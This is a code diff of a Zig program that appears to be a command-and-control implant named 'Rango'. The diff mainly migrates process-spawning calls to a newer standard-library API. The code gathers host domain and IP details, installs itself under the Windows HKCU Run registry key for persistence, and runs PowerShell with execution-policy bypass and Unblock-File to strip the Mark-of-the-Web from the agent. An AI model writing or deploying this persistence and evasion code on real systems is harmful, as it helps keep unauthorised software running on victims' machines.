@@ -56,12 +56,11 @@ pub const SystemInfo = struct {
 
     pub fn getDomain(self: *SystemInfo) ![]const u8 {
         if (builtin.os.tag == .windows) {
-            return std.process.getEnvVarOwned(self.allocator, "USERDOMAIN") catch |err| {
-                if (err == error.EnvironmentVariableNotFound) {
-                    return try self.allocator.dupe(u8, "WORKGROUP");
-                }
-                return err;
-            };
+            if (self.environ_map.get("USERDOMAIN")) |value| {
+                return self.allocator.dupe(u8, value);
+            } else {
+                return self.allocator.dupe(u8, "Unknown");
+            }
         } else {
             return try self.allocator.dupe(u8, "WORKGROUP"); // Default
         }
@@ -94,8 +93,7 @@ pub const SystemInfo = struct {
 
     pub fn getInternalIP(self: *SystemInfo) ![]const u8 {
         if (builtin.os.tag == .windows) {
-            const result = std.process.Child.run(.{
-                .allocator = self.allocator,
+            const result = std.process.run(self.allocator, self.io, .{
                 .argv = &.{"ipconfig"},
             }) catch |err| {
                 std.debug.print("{}\n", .{err});
@@ -247,8 +245,7 @@ pub const TimeUtils = struct {
 pub const PersistUtils = struct {
     pub fn install_cron(agent_path: []const u8, allocator: std.mem.Allocator, io: Io) !void {
         if (builtin.os.tag == .windows) {
-            const existing = try std.process.Child.run(.{
-                .allocator = allocator,
+            const existing = try std.process.run(allocator, io, .{
                 .argv = &.{
                     "reg.exe",
                     "query",
@@ -258,23 +255,21 @@ pub const PersistUtils = struct {
                 },
             });
 
-            const reg_exists = existing.term.Exited == 0;
+            const reg_exists = existing.term.exited == 0;
             if (reg_exists and std.mem.indexOf(u8, existing.stdout, agent_path) != null) {
                 return error.AlreadyPersistent;
             }
 
             const unblock_cmd = try std.fmt.allocPrint(allocator, "Unblock-File -Path \"{s}\"", .{agent_path});
             defer allocator.free(unblock_cmd);
-            const remove_motw = try std.process.Child.run(.{
-                .allocator = allocator,
+            const remove_motw = try std.process.run(allocator, io, .{
                 .argv = &.{ "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", unblock_cmd },
             });
 
-            if (remove_motw.term.Exited != 0) {
+            if (remove_motw.term.exited != 0) {
                 return error.UnblockFileFailed;
             }
-            const result = try std.process.Child.run(.{
-                .allocator = allocator,
+            const result = try std.process.run(allocator, io, .{
                 .argv = &.{
                     "reg.exe",
                     "add",
@@ -287,7 +282,7 @@ pub const PersistUtils = struct {
                 },
             });
 
-            if (result.term.Exited != 0) {
+            if (result.term.exited != 0) {
                 return error.RegistryWriteFailed;
             }
         } else {
@@ -326,11 +321,10 @@ pub const PersistUtils = struct {
     }
     pub fn remove_cron_entry(agent_path: []const u8, allocator: std.mem.Allocator, io: Io) !void {
         if (builtin.os.tag == .windows) {
-            const existing = try std.process.Child.run(.{
-                .allocator = allocator,
+            const existing = try std.process.run(allocator, io, .{
                 .argv = &.{ "reg.exe", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Rango", "/f" },
             });
-            if (existing.term.Exited != 0) {
+            if (existing.term.exited != 0) {
                 return error.RegistryDeleteFailed;
             }
         } else {
@@ -367,8 +361,7 @@ pub const PersistUtils = struct {
     }
     pub fn get_cron_entries(allocator: std.mem.Allocator, io: Io) !?[]const u8 {
         if (builtin.os.tag == .windows) {
-            const result = try std.process.Child.run(.{
-                .allocator = allocator,
+            const result = try std.process.run(allocator, io, .{
                 .argv = &.{
                     "reg.exe",
                     "query",
@@ -378,7 +371,7 @@ pub const PersistUtils = struct {
                 },
             });
 
-            if (result.term.Exited != 0) {
+            if (result.term.exited != 0) {
                 return try allocator.dupe(u8, "");
             }
             return try allocator.dupe(u8, result.stdout);
